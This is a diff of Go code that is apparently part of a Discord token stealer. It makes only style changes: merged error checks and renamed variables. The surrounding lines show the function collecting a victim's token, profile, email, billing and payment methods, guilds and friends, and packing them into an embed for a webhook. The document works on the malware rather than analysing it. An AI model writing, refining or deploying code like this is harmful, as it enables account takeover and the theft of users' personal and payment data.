@@ -233,8 +233,7 @@ func Run(webhook string) {
 		}
 
 		var user User
-		err = json.Unmarshal(body, &user)
-		if err != nil {
+		if err = json.Unmarshal(body, &user); err != nil {
 			return
 		}
 
@@ -244,8 +243,7 @@ func Run(webhook string) {
 		}
 
 		var billingData []Billing
-		err = json.Unmarshal(billing, &billingData)
-		if err != nil {
+		if err = json.Unmarshal(billing, &billingData); err != nil {
 			return
 		}
 
@@ -255,8 +253,7 @@ func Run(webhook string) {
 		}
 
 		var guildsData []Guild
-		err = json.Unmarshal(guilds, &guildsData)
-		if err != nil {
+		if err = json.Unmarshal(guilds, &guildsData); err != nil {
 			return
 		}
 
@@ -266,8 +263,8 @@ func Run(webhook string) {
 		}
 
 		var friendsData []Friend
-		err = json.Unmarshal(friends, &friendsData)
-		if err != nil {
+
+		if err = json.Unmarshal(friends, &friendsData); err != nil {
 			return
 		}
 
@@ -288,8 +285,8 @@ func Run(webhook string) {
 		badges := GetFlags(user.PublicFlags)
 		nitro := GetNitro(user.PremiumType)
 		paymentMethods := GetBilling(billingData)
-		hq_guilds := GetHQGuilds(guildsData, token)
-		hq_friends := GetHQFriends(friendsData)
+		hqGuilds := GetHQGuilds(guildsData, token)
+		hqFriends := GetHQFriends(friendsData)
 		if user.Email == "" {
 			user.Email = "None"
 		}
@@ -341,18 +338,18 @@ func Run(webhook string) {
 			},
 		}
 
-		if hq_guilds != "" {
+		if hqGuilds != "" {
 			embed["fields"] = append(embed["fields"].([]map[string]interface{}), map[string]interface{}{
 				"name":   "\u200b",
-				"value":  hq_guilds,
+				"value":  hqGuilds,
 				"inline": false,
 			})
 		}
 
-		if hq_friends != "" {
+		if hqFriends != "" {
 			embed["fields"] = append(embed["fields"].([]map[string]interface{}), map[string]interface{}{
 				"name":   "\u200b",
-				"value":  hq_friends,
+				"value":  hqFriends,
 				"inline": false,
 			})
 		}
